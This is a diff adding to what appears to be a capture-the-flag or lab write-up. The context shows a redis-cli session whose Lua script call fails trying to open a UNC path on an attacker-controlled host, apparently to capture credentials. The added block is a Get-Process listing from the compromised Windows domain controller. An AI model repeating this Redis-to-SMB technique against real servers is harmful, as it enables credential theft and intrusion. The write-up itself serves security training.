@@ -223,3 +223,69 @@ redis-cli -h 10.10.116.41 -p 6379
 (error) ERR Error running script (call to f_82d193bf3f0b9f38538d1d2e9ffdbe905ff5e323): @user_script:1: cannot open //10.8.117.56/test: Permission denied 
 10.10.116.41:6379>
 ```
+
+```
+PS C:\Users\enterprise-security\Desktop> Get-Process
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  
+-------  ------    -----      -----     ------     --  -- -----------                                                  
+    155      10    15876       2996              3020   0 amazon-ssm-agent                                             
+     76       5     2592       1316       0.05   2828   0 cmd                                                          
+     80       5      848       1556              1788   0 CompatTelRunner                                              
+    147       9     6616       1008       0.08    640   0 conhost                                                      
+    153       9     6612       2032              1396   0 conhost                                                      
+    148       9     7384       6872       0.39   1736   0 conhost                                                      
+    152       9     6612       1900              3596   0 conhost                                                      
+    377      15     2808       1672               380   0 csrss                                                        
+    163       9     1712         72               456   1 csrss                                                        
+    390      32    15284      13224              2372   0 dfsrs                                                        
+    185      12     2412       4336              2288   0 dfssvc                                                       
+    341      27     7688       3252              2356   0 dns                                                          
+    539      22    16288       9868               936   1 dwm                                                          
+     49       6     1608          0              1624   1 fontdrvhost                                                  
+     49       6     1436        148              1764   0 fontdrvhost                                                  
+      0       0       56          8                 0   0 Idle                                                         
+    468      25    11304      14096              3292   1 LogonUI                                                      
+   1579     154    41756      21408               616   0 lsass                                                        
+    489      30    31640       5704              2120   0 Microsoft.ActiveDirectory.WebServices                        
+    222      13     2916       1016              2800   0 msdtc                                                        
+    129       8     2028        412       0.00   3268   0 nssm                                                         
+    129       8     2036        472              3472   0 nssm                                                         
+    528      26    65872      51932       1.86   2852   0 powershell                                                   
+    142      12    21180        324       0.14   3824   0 redis-server                                                 
+      0      13      280       5760                84   0 Registry                                                     
+    446      16     4956       5240               592   0 services                                                     
+     53       3      512          0               276   0 smss                                                         
+    468      22     6012       1160              1520   0 spoolsv                                                      
+    160      10     1916       1948              3580   0 SppExtComObj                                                 
+    237      11     6368       7944              2404   0 sppsvc                                                       
+    176      11    17132       6204              1136   0 ssm-agent-worker                                             
+    401      24     8684       5000               308   0 svchost                                                      
+    215      12     1716       1688               376   0 svchost                                                      
+    542      27     8040       9236               448   0 svchost                                                      
+    540      18    14032       9468               680   0 svchost                                                      
+    598      17     4768       6992               804   0 svchost                                                      
+    633      19     3744       6888               860   0 svchost                                                      
+   1739      66    32740      46248               980   0 svchost                                                      
+    510      18     4268       3312               988   0 svchost                                                      
+    807      45     9432       9044              1040   0 svchost                                                      
+    397      32     9844       3176              1200   0 svchost                                                      
+    309      11     1988       1684              1404   0 svchost                                                      
+    161       8     1432        900              1504   0 svchost                                                      
+    192      13     4104      13048              1880   0 svchost                                                      
+    162      10     2048       1056              1972   0 svchost                                                      
+    201      10     2216       2280              2000   0 svchost                                                      
+    161       9     2144       1252              2072   0 svchost                                                      
+    422      19    16252      11140              2108   0 svchost                                                      
+    177      10     2404       5936              2660   0 svchost                                                      
+    205      11     2380      13740              2812   0 svchost                                                      
+   1381       0      192        132                 4   0 System                                                       
+    228      12     2724      15936              4028   0 taskhostw                                                    
+    245      17     2792       2480              2580   0 vds                                                          
+    172      11     1556        804               520   0 wininit                                                      
+    240      12     2692       1752               504   1 winlogon                                                     
+     54       4      720          0              2272   0 wlms                                                         
+    223      15     4352      11992               896   0 WmiPrvSE                                                     
+    311      13     5744      13056              2544   0 WmiPrvSE                                                     
+    175      10     6528       2208              2916   0 WmiPrvSE
+```
